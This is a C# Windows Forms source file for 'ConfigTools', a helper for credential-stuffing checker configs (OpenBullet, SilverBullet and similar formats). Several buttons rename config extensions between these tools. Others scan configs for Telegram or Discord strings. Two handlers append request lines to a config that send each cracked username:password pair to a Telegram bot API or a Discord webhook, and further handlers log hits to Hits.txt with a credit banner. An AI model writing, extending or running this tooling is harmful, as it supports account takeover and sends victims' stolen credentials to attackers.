using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ConfigTools
{
    public partial class Form1 : Form
    {
        //this code for making black title

        [DllImport("DwmApi")]
        private static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, int[] attrValue, int attrSize);

        protected override void OnHandleCreated(EventArgs e)
        {
            if (DwmSetWindowAttribute(Handle, 19, new[] { 1 }, 4) != 0)
                DwmSetWindowAttribute(Handle, 20, new[] { 1 }, 4);
        }
        public Form1()
        {
            InitializeComponent();
        }

        private void SelectPathBTN_Click(object sender, EventArgs e)
        {
         
            OpenFileDialog theDialog = new OpenFileDialog();
            theDialog.Title = "Open Config File";
            theDialog.Filter = "cyb files (*.cyb)|*.cyb|anom files (*.anom)|*.anom|loli files (*.loli)|*.loli|svb files (*.svb)|*.svb|All files (*.*)|*.*";
            if (theDialog.ShowDialog() == DialogResult.OK)
            {
                ConfigPath.Text = theDialog.FileName; 
            }
        }

        private void cyb_Click(object sender, EventArgs e)
        {
            try
            {
                string[] Files = Directory.GetFiles(".\\Configs");
                foreach (string CurFile in Files)
                {
                    bool flag = CurFile.Contains(".anom");
                    bool flag2 = CurFile.Contains(".svb");
                    bool flag3 = CurFile.Contains(".lo");
                    bool flag4 = CurFile.Contains(".ob");
                    bool flag5 = CurFile.Contains(".gub");
                    bool flag6 = CurFile.Contains(".blk");
                    bool flag7 = CurFile.Contains(".cyb");
                    bool flag8 = CurFile.Contains(".lba");
                    bool flag9 = CurFile.Contains(".dkb");
                    bool flag10 = CurFile.Contains(".agl");
                    bool flag11 = CurFile.Contains(".dev");

                    if (flag)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".cyb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag2)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".cyb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag3)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".cyb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag4)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".cyb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag5)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".cyb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag6)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".cyb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag7)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".cyb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag8)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".cyb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag9)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".cyb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag10)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".cyb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag11)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".cyb");
                        File.Move(CurFile, NewName);
                    }
                 

                    MessageBox.Show("Config Converted.");
                }
            }
            catch (Exception ex)
            {
               
                MessageBox.Show("Error");
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                string[] Files = Directory.GetFiles(".\\Configs");
                foreach (string CurFile in Files)
                {
                    bool flag = CurFile.Contains(".loli");
                    bool flag2 = CurFile.Contains(".svb");
                    bool flag3 = CurFile.Contains(".lo");
                    bool flag4 = CurFile.Contains(".ob");
                    bool flag5 = CurFile.Contains(".gub");
                    bool flag6 = CurFile.Contains(".blk");
                    bool flag7 = CurFile.Contains(".cyb");
                    bool flag8 = CurFile.Contains(".lba");
                    bool flag9 = CurFile.Contains(".dkb");
                    bool flag10 = CurFile.Contains(".agl");
                    bool flag11 = CurFile.Contains(".dev");
                    if (flag)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".anom");
                        File.Move(CurFile, NewName);
                    }
                    if (flag2)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".anom");
                        File.Move(CurFile, NewName);
                    }


                    if (flag3)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".anom");
                        File.Move(CurFile, NewName);
                    }


                    if (flag4)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".anom");
                        File.Move(CurFile, NewName);
                    }


                    if (flag5)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".anom");
                        File.Move(CurFile, NewName);
                    }


                    if (flag6)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".anom");
                        File.Move(CurFile, NewName);
                    }


                    if (flag7)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".anom");
                        File.Move(CurFile, NewName);
                    }


                    if (flag8)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".anom");
                        File.Move(CurFile, NewName);
                    }


                    if (flag9)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".anom");
                        File.Move(CurFile, NewName);
                    }


                    if (flag10)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".anom");
                        File.Move(CurFile, NewName);
                    }


                    if (flag11)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".anom");
                        File.Move(CurFile, NewName);
                    }
                
                    MessageBox.Show("Config Converted.");
                }
            }
            catch (Exception ex)
            {
               
                MessageBox.Show("Error");
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                string[] Files = Directory.GetFiles(".\\Configs");
                foreach (string CurFile in Files)
                {
                    bool flag = CurFile.Contains(".anom");
                    bool flag2 = CurFile.Contains(".svb");
                    bool flag3 = CurFile.Contains(".lo");
                    bool flag4 = CurFile.Contains(".ob");
                    bool flag5 = CurFile.Contains(".gub");
                    bool flag6 = CurFile.Contains(".blk");
                    bool flag7 = CurFile.Contains(".cyb");
                    bool flag8 = CurFile.Contains(".lba");
                    bool flag9 = CurFile.Contains(".dkb");
                    bool flag10 = CurFile.Contains(".agl");
                    bool flag11 = CurFile.Contains(".dev");

                    if (flag)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".loli");
                        File.Move(CurFile, NewName);
                    }


                    if (flag2)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".loli");
                        File.Move(CurFile, NewName);
                    }


                    if (flag3)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".loli");
                        File.Move(CurFile, NewName);
                    }


                    if (flag4)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".loli");
                        File.Move(CurFile, NewName);
                    }


                    if (flag5)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".loli");
                        File.Move(CurFile, NewName);
                    }


                    if (flag6)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".loli");
                        File.Move(CurFile, NewName);
                    }


                    if (flag7)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".loli");
                        File.Move(CurFile, NewName);
                    }


                    if (flag8)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".loli");
                        File.Move(CurFile, NewName);
                    }


                    if (flag9)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".loli");
                        File.Move(CurFile, NewName);
                    }


                    if (flag10)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".loli");
                        File.Move(CurFile, NewName);
                    }


                    if (flag11)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".loli");
                        File.Move(CurFile, NewName);
                    }

                 

                    MessageBox.Show("Config Converted.");
                }
            }
            catch (Exception ex)
            {
               

                MessageBox.Show("Error");
            }
        }

        private void svb_Click(object sender, EventArgs e)
        {
            try
            {
                string[] Files = Directory.GetFiles(".\\Configs");
                foreach (string CurFile in Files)
                {
                    bool flag = CurFile.Contains(".anom");
                    bool flag2 = CurFile.Contains(".loli");
                    bool flag3 = CurFile.Contains(".lo");
                    bool flag4 = CurFile.Contains(".ob");
                    bool flag5 = CurFile.Contains(".gub");
                    bool flag6 = CurFile.Contains(".blk");
                    bool flag7 = CurFile.Contains(".cyb");
                    bool flag8 = CurFile.Contains(".lba");
                    bool flag9 = CurFile.Contains(".dkb");
                    bool flag10 = CurFile.Contains(".agl");
                    bool flag11 = CurFile.Contains(".dev");

                    if (flag)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".svb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag2)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".svb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag3)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".svb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag4)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".svb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag5)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".svb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag6)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".svb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag7)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".svb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag8)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".svb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag9)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".svb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag10)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".svb");
                        File.Move(CurFile, NewName);
                    }


                    if (flag11)
                    {
                        string NewName = System.IO.Path.ChangeExtension(CurFile, ".svb");
                        File.Move(CurFile, NewName);
                    }
                
                    MessageBox.Show("Config Converted.");
                }
            }
            catch (Exception ex)
            {
              
                MessageBox.Show("Error");
            }

        }

        private void Convert_Click(object sender, EventArgs e)
        {

            try
            {
            Path.ChangeExtension(ConfigPath.Text, format.Text);
                MessageBox.Show("Converted");
            }
            catch
            {

                MessageBox.Show("Error To Convert");
            }
        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void tele_Click(object sender, EventArgs e)
        {
            try
            {


                var text = "TELEGRAM";

                var text2 = "https://api.telegram.org";



                string fName = ConfigPath.Text;

                StreamReader testTxt = new StreamReader(fName);

                string allRead = testTxt.ReadToEnd();

                testTxt.Close();


                if (Regex.IsMatch(allRead, text))

                {
                    Check.ForeColor = Color.Red;
                    Check.Text = ("founded\n");



                }

                else

                {
                    Check.ForeColor = Color.Green;
                    Check.Text = ("not found\n");

                }


                if (Regex.IsMatch(allRead, text2))

                {
                    Check.ForeColor = Color.Red;
                    Check.Text = ("Founded Api \n");



                }

                else

                {
                    Check.ForeColor = Color.Green;
                    Check.Text = ("not Found Api\n");

                }




            }
            catch
            {

            }
        }

        private void dis_Click(object sender, EventArgs e)
        {
            try
            {


                var textz = "Discord";





                string fName = ConfigPath.Text;

                StreamReader testTxt = new StreamReader(fName);

                string allRead = testTxt.ReadToEnd();

                testTxt.Close();


                if (Regex.IsMatch(allRead, textz))

                {
                    Check.ForeColor = Color.Red;
                    Check.Text = ("founded\n");



                }

                else

                {
                    Check.ForeColor = Color.Green;
                    Check.Text = ( "not found\n");

                }







            }
            catch
            {

            }
        }

        private void cuschk_Click(object sender, EventArgs e)
        {
            try
            {







                string fName = ConfigPath.Text;

                StreamReader testTxt = new StreamReader(fName);

                string allRead = testTxt.ReadToEnd();

                testTxt.Close();


                if (Regex.IsMatch(allRead, custom.Text))

                {
                    Check.ForeColor = Color.Red;
                    Check.Text = ("founded\n");



                }

                else

                {
                    Check.ForeColor = Color.Green;
                    Check.Text = (Environment.NewLine + "not found\n");

                }




            }
            catch
            {

            }
        }

        private void addtelehit_Click(object sender, EventArgs e)
        {
            var s = @"""";
            var koz = @"REQUEST GET" + " " + s + "https://api.telegram.org/bot" + token.Text + "/sendMessage?chat_id=" + usrid.Text + "&text" + "=<USER>:<PASS>" + s;

            try
            {
                using (StreamWriter sw = File.AppendText(ConfigPath.Text))
                {
                    sw.WriteLine(koz);


                }
               
                MessageBox.Show("Added In Your Config");
            }
            catch
            {

                MessageBox.Show("Error To Add");
            }
        }

        private void AddDis_Click(object sender, EventArgs e)
        {
            var s = @"""";
            var koz = @"REQUEST POST" + " " + s + WebHook.Text + s + "\n" + "  " + "CONTENT" + " " + @"""{\""content\"":\""<USER>:<PASS>\""}""" + "\n" + "  " + "CONTENTTYPE" + " " + s + "application/json" + s + "\n" + "  " + "HEADER" + "  " + s + "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" + s + "\n" + "  " + "HEADER" + "  " + s + "Pragma: no-cache" + s + "\n" + "  " + "HEADER" + "  " + s + "Accept: */*" + s + "\n";

            try
            {
                using (StreamWriter sw = File.AppendText(ConfigPath.Text))
                {
                    sw.WriteLine(koz);


                }
              
                MessageBox.Show("Added In Your Config");
            }
            catch
            {
              
                MessageBox.Show("Error To Add");
            }
        }

        private void Basic_Click(object sender, EventArgs e)
        {
            var koz = @"UTILITY File ""Hits.txt"" AppendLines ""<USER>:<PASS> """;

            try
            {
                using (StreamWriter sw = File.AppendText(ConfigPath.Text))
                {
                    sw.WriteLine(koz);

                }
               
                MessageBox.Show("Added In Your Config");
            }
            catch
            {
            
                MessageBox.Show("Error To Add");
            }
        }

        private void CreateAdd_Click(object sender, EventArgs e)
        {

            var s = @"""";
            var koz = @"UTILITY File ""Hits.txt"" AppendLines ""<<<<<<<<<<<<" + de.Text + ">>>>>>>>>>>>\\n\\nCombo:<USER>:<PASS>\\r\\nEmail:<USER>\\r\\nPassword:<PASS>\\n\\n<<<<<<" + pln.Text + ">>>>>>\\n\\nCapture:<" + cap.Text + ">\\r\\n<<<<<<" + end.Text + ">>>>>>\\n\\nConfig BY ->: " + maker.Text + "\\r\\nTelegram Channel: t.me/" + telechannel.Text + "\\r\\n===============" + end.Text + "===============" + s;

            try
            {
                using (StreamWriter sw = File.AppendText(ConfigPath.Text))
                {
                    sw.WriteLine(koz);

                }

               
                MessageBox.Show("Added In Your Config");
            }
            catch
            {
                MessageBox.Show("Error To Add");
            }
        }

        private void loadConfigToolStripMenuItem_Click(object sender, EventArgs e)
        {

            OpenFileDialog theDialog = new OpenFileDialog();
            theDialog.Title = "Open Config File";
            theDialog.Filter = "cyb files (*.cyb)|*.cyb|anom files (*.anom)|*.anom|loli files (*.loli)|*.loli|svb files (*.svb)|*.svb|All files (*.*)|*.*";
            if (theDialog.ShowDialog() == DialogResult.OK)
            {
                ConfigPath.Text = theDialog.FileName;
            }
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
         
        }

        private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Process.Start("https://t.me/ghoulblack");
        }

        private void openConfigsFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start(".\\Configs");
        }
    }
}
